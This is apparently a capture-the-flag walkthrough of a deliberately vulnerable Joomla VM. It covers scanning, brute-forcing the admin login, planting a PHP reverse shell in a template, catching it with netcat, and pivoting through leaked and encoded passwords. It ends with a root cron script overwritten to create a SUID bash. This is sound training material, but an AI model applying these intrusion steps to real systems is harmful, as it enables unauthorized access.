## MACHINE IP
```bash
192.168.167.79
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Fri Nov  7 22:19:40 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 192.168.167.79
Nmap scan report for 192.168.167.79
Host is up (0.28s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  7 22:20:42 2025 -- 1 IP address (1 host up) scanned in 61.83 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
## RECON
```bash
# Operating System                   //Found post Initial Enumeration
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
```
## ENUMERATION
```bash
# Port 80
sudo whatweb -v $url
Summary   : Apache[2.4.38], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)]

# Fuzzing
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 237ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 238ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 2378ms]
                        [Status: 200, Size: 125, Words: 7, Lines: 9, Duration: 245ms]
index.html              [Status: 200, Size: 125, Words: 7, Lines: 9, Duration: 243ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 248ms]
joomla                  [Status: 200, Size: 9992, Words: 501, Lines: 227, Duration: 285ms]

# Seems like joomla site 
sudo joomscan -u $url/joomla
[+] FireWall Detector                                                                                                                                                        22:27:22 [14/32]
[++] Firewall not detected
[+] Detecting Joomla Version
[++] Joomla 3.7.3rc1                  
[+] Core Joomla Vulnerability          
[++] Target Joomla core is not vulnerable
[+] Checking Directory Listing       
[++] directory has directory listing : 
http://192.168.167.79/joomla/administrator/components
http://192.168.167.79/joomla/administrator/modules
http://192.168.167.79/joomla/administrator/templates
http://192.168.167.79/joomla/images/banners

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder                        
[++] Admin page : http://192.168.167.79/joomla/administrator/

[+] Checking robots.txt existing     
[++] robots.txt is found
path : http://192.168.167.79/joomla/robots.txt                  

Interesting path found from robots.txt
http://192.168.167.79/joomla/joomla/administrator/              
http://192.168.167.79/joomla/administrator/
http://192.168.167.79/joomla/bin/
http://192.168.167.79/joomla/cache/
http://192.168.167.79/joomla/cli/
http://192.168.167.79/joomla/components/
http://192.168.167.79/joomla/includes/
http://192.168.167.79/joomla/installation/
http://192.168.167.79/joomla/language/
http://192.168.167.79/joomla/layouts/
http://192.168.167.79/joomla/libraries/
http://192.168.167.79/joomla/logs/
http://192.168.167.79/joomla/modules/
http://192.168.167.79/joomla/plugins/
http://192.168.167.79/joomla/tmp/
[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

- Try to brute force with creds
# Generate wordlist form site 
sudo cewl -d 2 -m 5 -w ./joom.txt http://192.168.167.79/joomla/index.php
- Trying with username as joomla and the wordlist

# Joomla Bruteforce
sudo nmap -sV -vv --script http-joomla-brute --script-args 'userdb=./users.txt,passdb=./joom.txt,http-joomla-brute.threads=3,http-joomla-brute.uri=/joomla/administrator/index.php,brute.
firstonly=true' $ip
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
| http-joomla-brute: 
|   Accounts: 
|     joomla:Gotham - Valid credentials
|_  Statistics: Performed 67 guesses in 11 seconds, average tps: 6.1
|_http-server-header: Apache/2.4.38 (Debian)

# Joomla Creds
joomla:Gotham

- Edit Templates - Protostar
- error.php contents with php reverseshell contents and save and open/execute starting a listener
```
## INITIAL SHELL
```bash
sudo nc -nvlp 80                                                                                                                            
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.167.79] 41528
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 11:50:20 up  1:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```
## PRIVILEGE ESCALATION
```bash
# Found some creds
/var/www/html/joomla/configuration.php: public $user = 'joomla'; public $password = 'babyjoker'; 

# Users with shell
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
rob:x:1000:1000:rob,,,:/home/rob:/bin/bash
abner:x:1001:1001:Abner,,,:/home/abner:/bin/bash
penguin:x:1002:1002:Penguin,,,:/home/penguin:/bin/bash

# Enumerating mysql using creds joomla:babyjoker
www-data@glasgowsmile:/tmp$ mysql -u joomla -p
Enter password:
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+

MariaDB [(none)]> use batjokerl
ERROR 1049 (42000): Unknown database 'batjokerl'
MariaDB [(none)]> use batjoke;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [batjoke]> show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [batjoke]> select * from equipment;
Empty set (0.000 sec)

MariaDB [batjoke]> select * from taskforcet;
ERROR 1146 (42S02): Table 'batjoke.taskforcet' doesn't exist
MariaDB [batjoke]> select * from taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+

# Decoding All base64 
Bane:baneishere
Aaron:aaronishere
Carnage:carnageishere
buster:busterishere
rob:???AllIHaveAreNegativeThoughts???
aunt:auntis the fuck here

# Worked Creds !!!
rob:???AllIHaveAreNegativeThoughts???

rob@glasgowsmile:~$ cat Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
rob@glasgowsmile:~$ pwd
/home/rob

# Decrypt using cyberchef
- ROT13 - Amount 1
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==

# Decode base64 Password for user abner 
abner:I33hope99my0death000makes44more8cents00than0my0life0
- Creds WOrked !!!

# Run linpeas as user abner
╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rwxr-xr-x 1 abner abner 516 Jun 16  2020 /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip

- Using abner creds to unzip works !!!
abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cp  .dear_penguins.zip /tmp/
abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cd /tmp/
abner@glasgowsmile:/tmp$ mv .dear_penguins.zip dear_penguins.zip 
abner@glasgowsmile:/tmp$ chmod 777 dear_penguins.zip 
abner@glasgowsmile:/tmp$ unzip dear_penguins.zip 
Archive:  dear_penguins.zip
[dear_penguins.zip] dear_penguins password: 
  inflating: dear_penguins           
abner@glasgowsmile:/tmp$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz

# Su as penguin using creds from file dear_penguins
penguin:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
- Worked !!!

penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 4 penguin penguin   4096 Aug 25  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt

# Tried all Initial privesv didn't work
- Run pspy
  
2025/11/07 12:48:01 CMD: UID=0     PID=12188  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 

- seems like .trash_old is executed with uid 0 root  
- Edit the file .trash_old
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ echo "cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash" > .trash_old
```
## ROOT | ADMINISTRATOR - PWNED
```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ /tmp/suidbash -p
suidbash-5.0# id
uid=1002(penguin) gid=1002(penguin) euid=0(root) groups=1002(penguin)
suidbash-5.0# whoami
root 
```
